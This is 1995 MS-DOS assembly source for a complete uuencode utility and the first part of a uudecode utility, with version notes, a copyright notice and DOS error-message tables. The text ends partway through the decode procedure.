;----------------------------------------------------------------------------

;----------------------------------------------------------------------------
; Changes in Version 1.1:
;
;    1.  Program modified so that encoded output file no longer contains any
;        space characters.  All characters which were formerly written as
;        spaces are now written as ` characters (backwards single quote,
;        ASCII value 96).  With this modification, mail programs which strip
;        trailing spaces from files will no longer cause problems.
;
;    2.  The character at the beginning of each line specifying the number of
;        encoded characters in the line will always represent a nonnegative
;        number when decoded.  This change is probably not very significant,
;        but it could prevent one potential problem.  If someone wrote a
;        uudecode program that treats the decoded value of the first
;        character in each line as an unsigned value, errors could result
;        from attempting to decode a file encoded using version 1.0 of this
;        program.
;
;    3.  Copyright message changed.
;----------------------------------------------------------------------------

;----------------------------------------------------------------------------
; Program should be linked to produce a COM file.
;
; Usage: uuencode INFILE OUTFILE
;
; INFILE and OUTFILE can be full pathnames such as C:\bin\prog.exe
;----------------------------------------------------------------------------

TAB           EQU       09h
SPACE         EQU       20h
CR            EQU       0Dh
LF            EQU       0Ah
IBUF_SIZE     EQU       30720               ;file input buffer size  (30 k)
OBUF_SIZE     EQU       30720               ;file output buffer size (30 k)

uuencode      SEGMENT   PARA      'CODE'

              ORG       80h
args          DB        128       DUP (?)   ;command line args in PSP

              ORG       100h
              ASSUME    CS: uuencode, DS: uuencode
              ASSUME    ES: uuencode, SS: uuencode

start:        CALL      parse_args          ;parse command line args
              CMP       BYTE PTR argc, 2
              JE        do_encode           ;disp usage msg if not 2 args
              MOV       AH, 09h
              LEA       DX, usage
              INT       21h
              MOV       AL, 1               ;exit code
              JMP       SHORT exit
do_encode:    CALL      encode              ;returns with exit code in AL
exit:         MOV       AH, 4Ch
              INT       21h                 ;terminate program

;----------------------------------------------------------------------------
; PROC encode:
;
; encode file
;
; NOTE: No registers need to be saved and restored, since this subroutine is
;       called immediately before the program exits.  Also, since this
;       subroutine has no local variables or parameters on the stack, a stack
;       frame doesn't need to be set up, and BP can be used as a general
;       purpose register.
;
;       The begin line of the output file will have the following format:
;
;          begin 600 [filename]
;
;       The number 600 specifies the permissions the file will have if it is
;       decoded on a UNIX system.  The number gets treated as an octal value
;       and corresponds to the following permissions:
;
;          user : read, write, (no execute)
;          group: none
;          other: none
;
;       These permissions are hardcoded into the program because MS-DOS does
;       not specify permissions for files.  If the above permissions are
;       unsatisfactory, they can be changed with chmod once the encoded file
;       is transferred to the UNIX system and decoded.  An alternative would
;       be to modify the permissions in this source code and reassemble it.
;       Of course, if the encoded file is to be decoded on a PC or some
;       other non-UNIX system, the permissions are ignored during decoding.
;
; global variables used:
;
;    if_handle  : stores handle for input file
;    of_handle  : stores handle for output file
;    obuf       : output file buffer
;    ibuf_n     : # of chars in ibuf (file input buffer)
;    ibuf_p     : ptr to next char in ibuf (file input buffer)
;    errno      : contains error codes
;
; return value: in AL: 1 if error occurred or 0 if no error
;----------------------------------------------------------------------------

encode        PROC      NEAR

              LOCALS    @@

              MOV       AX, 3D00h
              MOV       DX, argv            ;ptr to input filename in DX
              INT       21h                 ;open input file for reading
              JNC       @@cr_outfile
              MOV       SI, argv            ;filename for error msg
              XOR       CX, CX              ;no files to close
              JMP       @@rtn_error         ;return with error msg
@@cr_outfile: MOV       if_handle, AX       ;save file handle
              MOV       AH, 5Bh
              MOV       CX, 0020h           ;mode = archive
              MOV       DX, argv[2]         ;ptr to output file in DX
              INT       21h                 ;create output file (new file)
              JNC       @@cr_success
              MOV       SI, argv[2]         ;filename for error msg
              MOV       CX, 0100h
              JMP       @@rtn_error         ;return with error msg
@@cr_success: MOV       of_handle, AX       ;save file handle
              LEA       SI, beg
              LEA       DI, obuf            ;[DI] = next position in obuf
              MOV       CX, 5
              MOV       DX, CX
              SHL       DX, 1               ;DX will indicate # chars in obuf
              CLD
        REP   MOVSW                         ;put 'begin 600 ' in obuf
              MOV       SI, argv            ;[SI] = inp. filename (with path)
              CALL      excl_path           ;separate filename from pathname
              ADD       DX, CX              ;CX chars will be added to obuf
              CLD                           ;clear DF for rest of subroutine
              JCXZ      @@wrt_CR_LF
@@get_char:   LODSB                         ;get char from filename
              CMP       AL, 'A'
              JB        @@put_char
              CMP       AL, 'Z'
              JA        @@put_char
              ADD       AL, 20h             ;convert to lowercase
@@put_char:   STOSB                         ;put char in obuf
              LOOP      @@get_char          ;loop puts input filename in obuf
@@wrt_CR_LF:  MOV       AX, 0A0Dh           ;AL = CR, AH = LF
              STOSW
              ADD       DX, 2               ;... in obuf
              XOR       CX, CX              ;CX = # chars in ibuf
@@read_data:  CMP       CX, 45              ;start of outer loop
              JAE       @@read_ibuf
              CALL      fill_ibuf
              CMP       AL, 0
              JE        @@test_eof
              MOV       CH, 03h             ;close both files
              JMP       @@cl_files          ;return on error (ret val in AL)
@@long_jmp_1: JMP       @@do_end            ;JMP is > 127 bytes forward
@@long_jmp_2: JMP       @@flush_err         ; "        "        "
@@test_eof:   JCXZ      @@long_jmp_1        ;exit outer loop if ibuf empty
              MOV       BX, CX              ;set BX to # of chars to encode
              CMP       BX, 45
              JB        @@here
@@read_ibuf:  MOV       BX, 45              ;encode next 45 chars
@@here:       MOV       SI, BP              ;[SI] = 1st char to encode
              ADD       BP, BX              ;[BP] = next unread char in ibuf
              SUB       CX, BX              ;CX = # chars left in ibuf
              CMP       DX, OBUF_SIZE - 63
              JBE       @@do_encode
              CALL      flush_obuf          ;flush output buffer
              CMP       BH, 0
              JNE       @@long_jmp_2        ;jump on flush error
@@do_encode:  MOV       AL, BL              ;AL = # chars to encode (45 max.)
              CMP       AL, 0
              JG        @@wrt_num
              XOR       AL, AL              ;make sure AL is nonnegative
@@wrt_num:    AND       AL, 77o
              JNZ       @@1
              ADD       AL, 64              ;encode as ` char
@@1:          ADD       AL, SPACE
              STOSB                         ;store AL ...
              INC       DX                  ;... in obuf
              CMP       BL, 0
              JLE       @@add_CR_LF         ;skip inner loop if BL <= 0
              EVEN
              NOP
@@inner_loop: LODSB
              MOV       AH, AL
              SHR       AL, 1
              SHR       AL, 1
              AND       AL, 77o
              JNZ       @@2
              ADD       AL, 64              ;encode as ` char
@@2:          ADD       AL, SPACE
              STOSB                         ;store AL ...
              INC       DX                  ;... in obuf
              MOV       AL, AH
              SHL       AL, 1
              SHL       AL, 1
              SHL       AL, 1
              SHL       AL, 1
              AND       AL, 60o
              MOV       BH, AL
              LODSB
              EVEN
              MOV       AH, AL
              SHR       AL, 1
              SHR       AL, 1
              SHR       AL, 1
              SHR       AL, 1
              AND       AL, 17o
              OR        AL, BH
              AND       AL, 77o
              JNZ       @@3
              ADD       AL, 64              ;encode as ` char
@@3:          ADD       AL, SPACE
              STOSB                         ;store AL ...
              INC       DX                  ;... in obuf
              MOV       AL, AH
              SHL       AL, 1
              SHL       AL, 1
              AND       AL, 74o
              MOV       BH, AL
              LODSB
              EVEN
              MOV       AH, AL
              SHR       AL, 1
              SHR       AL, 1
              SHR       AL, 1
              SHR       AL, 1
              SHR       AL, 1
              SHR       AL, 1
              AND       AL, 3o
              OR        AL, BH
              AND       AL, 77o
              JNZ       @@4
              ADD       AL, 64              ;encode as ` char
@@4:          ADD       AL, SPACE
              STOSB                         ;store AL ...
              INC       DX                  ;... in obuf
              MOV       AL, AH
              AND       AL, 77o
              JNZ       @@5
              ADD       AL, 64              ;encode as ` char
@@5:          ADD       AL, SPACE
              STOSB                         ;store AL ...
              INC       DX                  ;... in obuf
              SUB       BL, 3
              JG        @@inner_loop        ;loop again if BL > 0
@@add_CR_LF:  MOV       AX, 0A0Dh           ;AL = CR, AH = LF
              STOSW
              ADD       DX, 2
              JMP       @@read_data         ;repeat outer loop
@@do_end:     CMP       DX, OBUF_SIZE - 8
              JBE       @@wrt_end
              CALL      flush_obuf          ;flush output buffer
              CMP       BH, 0
              JNE       @@flush_err
@@wrt_end:    LEA       SI, endline
              MOV       CX, 8
              ADD       DX, CX
              SHR       CX, 1
        REP   MOVSW                         ;copy end line into obuf
              CALL      flush_obuf          ;write any remaining chars
              CMP       BH, 0
              JNE       @@flush_err
              MOV       CX, 0301h
              XOR       DH, DH              ;return 0 (success)
              JMP       SHORT @@cl_files
@@flush_err:  MOV       CX, 0300h
              JMP       SHORT @@set_DH
@@rtn_error:  MOV       BYTE PTR errno, AL
              PUSH      SI
              CALL      disp_error
@@set_DH:     MOV       DH, 1               ;return 1 (error)
@@cl_files:   MOV       DL, CH
              AND       DL, 01h
              JZ        @@test_outf
              MOV       AH, 3Eh
              MOV       BX, if_handle
              INT       21h
@@test_outf:  AND       CH, 02h
              JZ        @@rtn
              MOV       AH, 3Eh
              MOV       BX, of_handle
              INT       21h
              JNC       @@rtn
              CMP       CL, 01h
              JNE       @@rtn               ;skip if msg already displayed
              MOV       BYTE PTR errno, AL
              MOV       BX, argv[2]
              PUSH      BX
              CALL      disp_error

@@rtn:        MOV       AL, DH              ;return value in AL
              RET

encode        ENDP

;----------------------------------------------------------------------------
; end PROC encode
;----------------------------------------------------------------------------

;----------------------------------------------------------------------------
; PROC excl_path:
;
; find start of actual filename in pathname pointed to by SI; on exit, SI
; will point to first char in filename, and CX will contain length of
; filename
;
;    example: pathname = 'c:\bin\abc.exe'
;                               ^
;                               |
;                               +--- SI will point here on exit
;
;                                    CX will equal 7 (length of 'abc.exe')
;
; parameters:
;
;    SI: ptr to pathname; will point to actual filename within pathname on
;        exit
;
; return value: in CX: length of actual filename
;----------------------------------------------------------------------------

excl_path     PROC      NEAR

              LOCALS    @@

              PUSH      AX
              PUSH      DX
              PUSH      DI

              XOR       AL, AL              ;NULL char in AL
              MOV       DI, SI
              MOV       CX, 128
              CLD
        REPNE SCASB                         ;look for terminating null char
              SUB       DI, 2               ;[DI] = last char in dir path
              MOV       SI, DI
              SUB       CX, 128
              NEG       CX                  ;CX = length of pathstring + 1
              MOV       DI, CX
              DEC       DI                  ;DI = length of pathstring
              STD                           ;scan backwards from end
@@find_char:  LODSB                         ;loop searches for ':' or '\',
              CMP       AL, '\'             ;which will be last char in dir
              LAHF                          ;path; when loop exits, CX will
              MOV       DH, AH              ;equal the # of chars in dir path
              CMP       AL, ':'
              LAHF
              OR        DH, AH
              AND       DH, 40h
              LOOPZ     @@find_char
              ADD       SI, 2               ;[SI] = 1st char in filename
              SUB       DI, CX
              MOV       CX, DI              ;CX = # of chars in filename

              POP       DI
              POP       DX
              POP       AX
              RET

excl_path     ENDP

;----------------------------------------------------------------------------
; end PROC excl_path
;----------------------------------------------------------------------------

;----------------------------------------------------------------------------
; PROC fill_ibuf:
;
; attempt to fill file input buffer; called from subroutine 'encode' when
; buffer is empty or almost empty
;
; parameters:
;
;    CX: # of chars in input buffer; gets updated on return
;    BP: ptr to next char in input buffer; gets updated on return
;
; global variables used:
;
;    argv     : stores input filename
;    if_handle: file handle of input file
;    ibuf     : input file buffer
;    errno    : stores error codes
;
; return value: in AL: 0 on success, 1 on error
;----------------------------------------------------------------------------

fill_ibuf     PROC      NEAR

              LOCALS    @@

              PUSH      BX
              PUSH      DX
              PUSH      SI
              PUSH      DI
              PUSH      AX

              MOV       AX, CX              ;save value in CX
              MOV       SI, BP
              LEA       DI, ibuf
        REP   MOVSB                         ;move chars to start of ibuf
              MOV       CX, IBUF_SIZE
              SUB       CX, AX              ;# chars to read from file in CX
              LEA       DX, ibuf
              ADD       DX, AX              ;[DX] = 1st empty place in ibuf
              MOV       SI, AX              ;save value in AX
              MOV       AH, 3Fh
              MOV       BX, if_handle
              INT       21h                 ;attempt to fill ibuf
              JNC       @@set_vars
              MOV       BYTE PTR errno, AL  ;error reading data from disk
              MOV       BX, argv            ;ptr to input filename in BX
              PUSH      BX
              CALL      disp_error          ;display error msg
              MOV       BL, 1               ;return 1 (error)
              JMP       SHORT @@rtn
@@set_vars:   MOV       CX, AX
              ADD       CX, SI              ;CX = # chars in input buffer
              LEA       BP, ibuf            ;[BP] = next unread char in ibuf
              XOR       BL, BL              ;return 0 (success)

@@rtn:        POP       AX
              MOV       AL, BL
              POP       DI
              POP       SI
              POP       DX
              POP       BX
              RET

fill_ibuf     ENDP

;----------------------------------------------------------------------------
; end PROC fill_ibuf
;----------------------------------------------------------------------------

;----------------------------------------------------------------------------
; PROC flush_obuf:
;
; flush file output buffer; called from subroutine 'encode'
;
; parameters:
;
;    DX: # of chars in output buffer; gets updated on return
;    DI: points to next available position in obuf; gets updated on return
;
; global variables used:
;
;    argv[2]  : stores ptr to output filename
;    of_handle: file handle of output file
;    obuf     : output file buffer
;    errno    : stores error codes
;
; return value: in BH: 0 on success, 1 on error
;----------------------------------------------------------------------------

flush_obuf    PROC      NEAR

              LOCALS    @@

              PUSH      AX
              PUSH      CX
              PUSH      BX

              MOV       AH, 40h
              MOV       BX, of_handle
              MOV       CX, DX
              LEA       DX, obuf
              INT       21h                 ;write buffer to disk
              JNC       @@test_full
              MOV       BYTE PTR errno, AL  ;error writing data to disk
@@disp_msg:   MOV       BX, argv[2]         ;ptr to output filename in BX
              PUSH      BX
              CALL      disp_error          ;display error msg
              MOV       CL, 1               ;return 1 (error)
              JMP       SHORT @@rtn
@@test_full:  CMP       AX, CX
              JE        @@set_vars
              MOV       BYTE PTR errno, 27h ;disk full
              JMP       SHORT @@disp_msg
@@set_vars:   XOR       DX, DX              ;0 chars in obuf
              LEA       DI, obuf            ;[DI] = start of obuf
              MOV       CL, DL              ;return 0 (success)

@@rtn:        POP       BX
              MOV       BH, CL
              POP       CX
              POP       AX
              RET

flush_obuf    ENDP

;----------------------------------------------------------------------------
; end PROC flush_obuf
;----------------------------------------------------------------------------

;----------------------------------------------------------------------------
; PROC parse_args:
;
; parse command line argument string in PSP, first converting any tabs to
; spaces and any lowercase letters to uppercase; add NULL char (ASCII value
; 0) to end of each arg; store pointers to args in array argv and store # of
; args in argc
;
; NOTE: there is no need to save and restore registers, since this will
;       always be the first subroutine that gets called
;
; parameters: none
;
; global variables used:
;
;    args: section of PSP containing command line argument string
;    argc: on exit, will equal # of args found
;    argv: on exit, will contain array of pointers to args in PSP
;----------------------------------------------------------------------------

parse_args    PROC      NEAR

              LOCALS    @@

              CLD                           ;clear DF for entire subroutine
              LEA       DI, args            ;[DI] = length byte for args str.
              XOR       CH, CH
              MOV       CL, [DI]            ;CX = # chars in args string
              JCXZ      @@clear_BX
              INC       DI                  ;[DI] = first char in args string
              MOV       SI, DI
              MOV       BX, CX              ;save CX
              MOV       DX, DI              ;save DI
@@convert:    LODSB
              CMP       AL, 'a'
              JB        @@do_tabs
              CMP       AL, 'z'
              JA        @@do_tabs
              SUB       AL, 20h             ;convert to uppercase
@@do_tabs:    CMP       AL, TAB
              JNE       @@put_char
              MOV       AL, SPACE           ;convert TAB to SPACE
@@put_char:   STOSB
              LOOP      @@convert
              MOV       DI, DX              ;restore DI
              MOV       AL, TAB
              MOV       DL, SPACE
              XCHG      AX, DX              ;SPACE in AL
              MOV       CX, BX              ;restore CX
              INC       CX
@@clear_BX:   XOR       BX, BX              ;use BX to index argv array
              MOV       DL, BL              ;NULL char in DL
@@lp:   REPE  SCASB                         ;look for next nonspace char
              JCXZ      @@lp_done           ;jump if no more nonspace chars
              DEC       DI
              MOV       argv[BX], DI        ;ptr to arg in argv
              INC       DI
              ADD       BX, 2
        REPNE SCASB                         ;look for next SPACE char
              DEC       DI
              XCHG      AX, DX              ;NULL char in AL
              STOSB                         ;add treminating NULL char
              XCHG      AX, DX              ;SPACE in AL
              JCXZ      @@lp_done           ;jump if no more space chars
              JMP       SHORT @@lp          ;continue parsing args
@@lp_done:    SHR       BL, 1
              MOV       argc, BL            ;# args found in argc
              RET

parse_args    ENDP

;----------------------------------------------------------------------------
; end PROC parse_args
;----------------------------------------------------------------------------

;----------------------------------------------------------------------------
; PROC disp_error:
;
; display error message for file find
;
; NOTE: Since the path name which just failed is an ASCIIZ (NULL terminated)
;       string, we can't print it with function 09h of INT 21h.  This is
;       because the function expects a $ terminated string and the pathname
;       might have a $ in it.  Therefore, the string is printed by repeatedly
;       calling function 02h of INT 21h (display char).  This isn't very
;       efficient, but who cares, since all we are printing is one string.
;
; parameters on stack:
;
;    pathname: pointer to ASCIIZ string containing pathname
;
; global variables used:
;
;    errno: error code passed in this variable
;----------------------------------------------------------------------------

disp_error    PROC      NEAR

              ARG       pathname: WORD = ARG_N

              LOCALS    @@

              PUSH      BP
              MOV       BP, SP
              PUSH      AX
              PUSH      BX
              PUSH      DX

              MOV       AH, 09h
              LEA       DX, uu
              INT       21h                 ;display 'uudecode: '
              MOV       BX, pathname        ;[BX] = path string
@@do_char:    MOV       DL, [BX]            ;get char from path string
              CMP       DL, 0
              JE        @@disp_err          ;exit loop if NULL char
              MOV       AH, 02h
              INT       21h                 ;display char
              INC       BX                  ;[BX] = next char in path string
              JMP       SHORT @@do_char
@@disp_err:   MOV       AH, 09h
              XOR       BH, BH
              MOV       BL, errno
              SHL       BL, 1
              MOV       DX, errors[BX]
              INT       21h                 ;disp error msg string

              POP       DX
              POP       BX
              POP       AX
              POP       BP
              RET       ARG_N

disp_error    ENDP

;----------------------------------------------------------------------------
; end PROC disp_error
;----------------------------------------------------------------------------

usage         DB        'Usage: uuencode INFILE OUTFILE$'
uu            DB        'uuencode: $'
              EVENDATA
beg           DB        'begin 600 '
endline       DB        60h, CR, LF, 'end', CR, LF

error_00h     DB        '$'
error_01h     DB        ': Invalid function code', CR, LF, '$'
error_02h     DB        ': File not found', CR, LF, '$'
error_03h     DB        ': Path not found', CR, LF, '$'
error_04h     DB        ': Too many open files', CR, LF, '$'
error_05h     DB        ': Access denied', CR, LF, '$'
error_08h     DB        ': Out of memory', CR, LF, '$'
error_0Fh     DB        ': Invalid drive', CR, LF, '$'
error_13h     DB        ': Disk is write protected', CR, LF, '$'
error_14h     DB        ': Bad disk unit', CR, LF, '$'
error_15h     DB        ': Drive not ready', CR, LF, '$'
error_17h     DB        ': CRC error', CR, LF, '$'
error_19h     DB        ': Seek error', CR, LF, '$'
error_1Ah     DB        ': Not a DOS disk', CR, LF, '$'
error_1Bh     DB        ': Sector not found', CR, LF, '$'
error_1Fh     DB        ': General failure', CR, LF, '$'
error_27h     DB        ': Disk is full', CR, LF, '$'
error_50h     DB        ': File already exists', CR, LF, '$'
error_52h     DB        ': Cannot make directory entry', CR, LF, '$'
error_54h     DB        ': Out of structures', CR, LF, '$'
errors        DW        error_00h, error_01h, error_02h, error_03h, error_04h
              DW        error_05h, error_00h, error_00h, error_08h, error_00h
              DW        error_00h, error_00h, error_00h, error_00h, error_00h
              DW        error_0Fh, error_00h, error_00h, error_00h, error_13h
              DW        error_14h, error_15h, error_00h, error_17h, error_00h
              DW        error_19h, error_1Ah, error_1Bh, error_00h, error_00h
              DW        error_00h, error_1Fh, error_00h, error_00h, error_00h
              DW        error_00h, error_00h, error_00h, error_00h, error_27h
              DW        error_00h, error_00h, error_00h, error_00h, error_00h
              DW        error_00h, error_00h, error_00h, error_00h, error_00h
              DW        error_00h, error_00h, error_00h, error_00h, error_00h
              DW        error_00h, error_00h, error_00h, error_00h, error_00h
              DW        error_00h, error_00h, error_00h, error_00h, error_00h
              DW        error_00h, error_00h, error_00h, error_00h, error_00h
              DW        error_00h, error_00h, error_00h, error_00h, error_00h
              DW        error_00h, error_00h, error_00h, error_00h, error_00h
              DW        error_50h, error_00h, error_52h, error_00h, error_54h
versao        DB        ' uuencode version 1.1 ', CR, LF
copyright     DB        ' Copyright 1995, David S. Peterson'

              EVENDATA
errno         DB        ?                   ;keeps track of error codes
              EVENDATA
argc          DB        ?                   ;# of command line args
              EVENDATA
argv          DW        64      DUP (?)     ;array of pointers to args in PSP
if_handle     DW        ?                   ;input file handle
of_handle     DW        ?                   ;output file handle
              EVENDATA
ibuf          DB        IBUF_SIZE DUP (?)   ;file input buffer
              EVENDATA
obuf          DB        OBUF_SIZE DUP (?)   ;file output buffer

uuencode      ENDS
              END       start
;----------------------------------------------------------------------------


                           UUdecode 


;----------------------------------------------------------------------------
; UUDECODE program, version 1.1
;
; Copyright 1995, David S. Peterson
;
; This program may be used and distributed freely as long as this copyright
; notice is not removed.  Feel free to use sections of code from this program
; as part of your own programs, but please leave this file intact.  I am
; reasonably certain that this program doesn't have any major bugs, but its
; use is at your own risk.  If you find any bugs in this program, or have any
; questions or comments, please feel free to send me some email or write me a
; letter.  My email address is:
;
;    dspeter1@eos.ncsu.edu
;
; and my mailing address is:
;
;    David S. Peterson
;    3717 Williamsborough Ct.
;    Raleigh, NC 27609
;    USA
;
; If you like this program, feel free to send me a postcard from your home
; town.
;----------------------------------------------------------------------------

;----------------------------------------------------------------------------
; Changes in Version 1.1:
;
;    No changes made to content of program.  Copyright message changed.
;----------------------------------------------------------------------------

;----------------------------------------------------------------------------
; Program should be linked to produce a COM file.
;
; Usage: uudecode PATH1 [PATH2 ...]
;
; PATH1, PATH2, etc. can contain wildcard characters such as * and ?
;----------------------------------------------------------------------------

TAB           EQU       09h
SPACE         EQU       20h
CR            EQU       0Dh
LF            EQU       0Ah
IBUF_SIZE     EQU       30720               ;file input buffer size  (30 k)
OBUF_SIZE     EQU       30720               ;file output buffer size (30 k)

fileinfo      STRUC
 f_reserved   DB        21        DUP (?)
 f_attribute  DB        ?
 f_filetime   DW        ?
 f_filedate   DW        ?
 f_size       DD        ?
 f_filename   DB        13        DUP (?)
fileinfo      ENDS

uudecode      SEGMENT   PARA      'CODE'

              ORG       80h
args          DB        128       DUP (?)   ;command line args in PSP

              ORG       100h
              ASSUME    CS: uudecode, DS: uudecode
              ASSUME    ES: uudecode, SS: uudecode

start:        CALL      parse_args          ;parse command line args
              MOV       AH, 1Ah
              LEA       DX, dta
              INT       21h                 ;set DTA for file find functions
              CMP       BYTE PTR argc, 0
              JNE       process_args        ;disp usage msg if no args
              MOV       AH, 09h
              LEA       DX, usage
              INT       21h
              MOV       BYTE PTR ret_val, 1 ;exit code
              JMP       SHORT exit
process_args: XOR       SI, SI              ;SI is array index for argv
              MOV       BX, SI
              MOV       BL, argc
              SHL       BL, 1               ;value to compare with SI in loop
              MOV       ret_val, BH
find_first:   MOV       AH, 4Eh
              MOV       CX, 21h             ;include read only and archive
              MOV       DX, argv[SI]        ;DX points to arg in PSP
              INT       21h                 ;find first matching filename
              PUSH      argv[SI]            ;arg for disp_error or getpath
              JNC       do_path             ;jump on success (file found)
              CMP       AL, 03h
              JE        set_errno
              MOV       AL, 02h             ;file not found
set_errno:    MOV       BYTE PTR errno, AL
              CALL      disp_error          ;disp error msg
              JMP       SHORT arg_done      ;process next arg
do_path:      CALL      getpath             ;combine dir path with filename
do_decode:    CALL      decode              ;decode file (name in filepath)
              OR        ret_val, AL         ;ret val from decode in AL
find_next:    MOV       AH, 4Fh
              INT       21h                 ;find next file
              JC        arg_done            ;do next arg if file not found
              CALL      decode              ;decode file (name in filepath)
              OR        ret_val, AL         ;ret val from decode in AL
              JMP       SHORT find_next
arg_done:     ADD       SI, 2
              CMP       SI, BX
              JB        find_first
exit:         MOV       AH, 4Ch
              MOV       AL, ret_val
              INT       21h                 ;terminate program

;----------------------------------------------------------------------------
; PROC decode:
;
; decode file
;
; parameters: filename to decode gets passed in global variable filepath
;
; local variables on stack:
;
;    misc: used to temporarily hold return value for subroutine
;
; global variables used:
;
;    filepath   : contains filename to decode
;    outfilename: used to store output filename
;    if_handle  : stores handle for input file
;    of_handle  : stores handle for output file
;    obuf       : output file buffer
;    ibuf_n     : # of chars in ibuf (file input buffer)
;    line_ptr   : ptr to lines read from input file
;    errno      : contains error codes
;
; return value: in AL: 1 if error occurred or 0 if no error
;----------------------------------------------------------------------------

decode        PROC      NEAR

              LOCAL     misc: BYTE = LOC_N

              LOCALS    @@

              PUSH      BP
              MOV       BP, SP
              SUB       SP, LOC_N
              PUSH      BX
              PUSH      CX
              PUSH      DX
              PUSH      SI
              PUSH      DI
              PUSH      AX

              MOV       BYTE PTR errno, 0   ;no system errors yet
              MOV       AX, 3D00h
              LEA       DX, filepath
              INT       21h                 ;open input file for reading
              JNC       @@op_success
              LEA       SI, filepath        ;filename for error msg
              MOV       BYTE PTR errno, AL
              XOR       CX, CX              ;no files to close
              JMP       @@rtn_error         ;return with error msg
@@op_success: MOV       if_handle, AX       ;save file handle
              MOV       WORD PTR ibuf_n, 0  ;clear input file buffer
              CALL      find_begin          ;find begin line
              LEA       SI, filepath        ;filename for error msg
              CMP       AL, -2
              JE        @@here              ;jump if disk error
              CMP       AL, -1
              JNE       @@test_fmt
@@here:       MOV       CX, 0100h
              JMP       @@rtn_error
@@test_fmt:   CMP       AL, -2
              JNE       @@cr_outfile
              MOV       CX, 0101h           ;close input file, unknown format
              JMP       @@rtn_error
@@cr_outfile: MOV       AH, 5Bh
              MOV       CX, 0020h           ;mode = archive
              LEA       DX, outfilename
              INT       21h                 ;create output file (new file)
              JNC       @@cr_success
              LEA       SI, outfilename     ;filename for error msg
              MOV       BYTE PTR errno, AL
              MOV       CX, 0100h           ;close input file
              JMP       @@rtn_error         ;error opening output file
@@cr_success: MOV       of_handle, AX       ;save file handle
              XOR       DX, DX              ;0 chars in obuf
              LEA       DI, obuf            ;[DI] = next position in obuf
@@get_line:   CALL      readline            ;start of outer loop
              CMP       AH, -1
              JNE       @@test_err
              LEA       SI, filepath        ;filename for error msg
              MOV       CX, 0301h           ;close both files, unknown format
              JMP       @@rtn_error
@@test_err:   CMP       AH, -2
              JNE       @@test_eof
              LEA       SI, filepath
              MOV       CX, 0300h
              JMP       @@rtn_error
@@test_eof:   CMP       AL, 0
              JE        @@do_flush
              LEA       SI, filepath        ;filename for error msg
              MOV       CX, 0302h           ;close both files, short file
              JMP       @@rtn_error
@@long_jmp_1: JMP       @@flush_err         ;JMP is > 127 bytes forward
@@long_jmp_2: JMP       @@flush             ; "           "           "
@@do_flush:   CMP       DX, OBUF_SIZE - 60  ;flush obuf if not enough room
              JBE       @@load_SI           ;for at least 60 more chars
              CALL      flush_obuf
              CMP       CH, 0
              JNE       @@long_jmp_1        ;flush error
@@load_SI:    MOV       SI, line_ptr        ;SI will index line from readline
              CLD                           ;DF stays clear during inner loop
              LODSB                         ;get 1st char in line
              SUB       AL, SPACE           ;compute DEC(AL) ...
              AND       AL, 77o             ;...
              CMP       AL, 0               ;treat AL as signed value
              JLE       @@long_jmp_2        ;exit outer loop if AL < 0
              MOV       BL, AL              ;BL stores n (loop counter)
              CMP       BL, 3
              JL        @@below_3           ;treat BL as signed value
@@inner_loop: LODSW
              SUB       AL, SPACE
              AND       AL, 77o
              SHL       AL, 1
              SHL       AL, 1
              SUB       AH, SPACE
              AND       AH, 77o
              MOV       CL, AH
              SHR       AH, 1
              SHR       AH, 1
              SHR       AH, 1
              SHR       AH, 1
              OR        AL, AH
              STOSB
              LODSW
              SHL       CL, 1
              SHL       CL, 1
              SHL       CL, 1
              SHL       CL, 1
              SUB       AL, SPACE
              AND       AL, 77o
              MOV       BH, AL
              SHR       AL, 1
              SHR       AL, 1
              OR        AL, CL
              STOSB
              EVEN
              SHL       BH, 1
              SHL       BH, 1
              SHL       BH, 1
              SHL       BH, 1
              SHL       BH, 1
              SHL       BH, 1
              SUB       AH, SPACE
              AND       AH, 77o
              OR        AH, BH
              MOV       AL, AH
              STOSB
              ADD       DX, 3
              SUB       BL, 3
              CMP       BL, 3
              JGE       @@inner_loop        ;repeat inner loop if BL >= 3
@@below_3:    CMP       BL, 1
              JL        @@long_jmp_3        ;repeat outer loop if BL < 1
@@next:       LODSW
              EVEN
              SUB       AL, SPACE
              AND       AL, 77o
              SHL       AL, 1
              SHL       AL, 1
              SUB       AH, SPACE
              AND       AH, 77o
              MOV       CL, AH
              SHR       AH, 1
              SHR       AH, 1
              SHR       AH, 1
              SHR       AH, 1
              OR        AL, AH
              STOSB
              INC       DX
              CMP       BL, 2
              JL        @@long_jmp_3        ;repeat outer loop if BL < 2
              LODSB
              EVEN
              SHL       CL, 1
              SHL       CL, 1
              SHL       CL, 1
              SHL       CL, 1
              SUB       AL, SPACE
              AND       AL, 77o
              SHR       AL, 1
              SHR       AL, 1
              OR        AL, CL
              STOSB
              INC       DX
              JMP       @@get_line          ;do outer loop again
@@long_jmp_3: JMP       @@get_line          ;JMP is > 127 bytes backward
@@flush:      CALL      flush_obuf          ;write any remaining chars
              CMP       CH, 0
              JE        @@find_end
@@flush_err:  MOV       BYTE PTR misc, 1    ;return value in misc
              MOV       CX, 0300h           ;close both files
              JMP       SHORT @@cl_files    ;close files and return
@@find_end:   CALL      readline            ;read line from input file
              MOV       SI, line_ptr        ;SI will index line from readline
              CMP       AH, -2
              JNE       @@cmp_line
              LEA       SI, filepath
              MOV       CX, 0300h
              JMP       SHORT @@rtn_error
@@cmp_line:   LEA       DI, endline
              MOV       CX, 3
              CLD
        REPE  CMPSB
              JNE       @@no_end
              CMP       AH, 3
              JB        @@no_end
              JE        @@rtn_good
              LODSB                         ;make sure next char is CR or ...
              CMP       AL, CR              ;
              JE        @@rtn_good          ;
              CMP       AL, SPACE           ;
              JE        @@rtn_good          ;
              CMP       AL, TAB             ;
              JE        @@rtn_good          ;... whitespace
@@no_end:     LEA       SI, filepath        ;filename for error msg
              MOV       CX, 0303h           ;close both files, no end line
              JMP       SHORT @@rtn_error
@@rtn_good:   MOV       BYTE PTR misc, 0    ;return value in misc
              MOV       CX, 0304h           ;close both, disp msg on error
              JMP       SHORT @@cl_files    ;close files and return
@@rtn_error:  MOV       BYTE PTR misc, 1    ;return value in misc
              PUSH      SI
              CALL      disp_error          ;display error msg
              CMP       BYTE PTR errno, 0
              JNE       @@cl_files          ;done if system msg was displayed
              MOV       AH, 09h
              XOR       BH, BH
              MOV       BL, CL
              MOV       DX, msgs[BX]        ;[DX] = rest of error msg
              INT       21h                 ;display rest of error msg
@@cl_files:   MOV       AL, CH
              AND       AL, 01h
              JZ        @@test_outf
              MOV       AH, 3Eh
              MOV       BX, if_handle
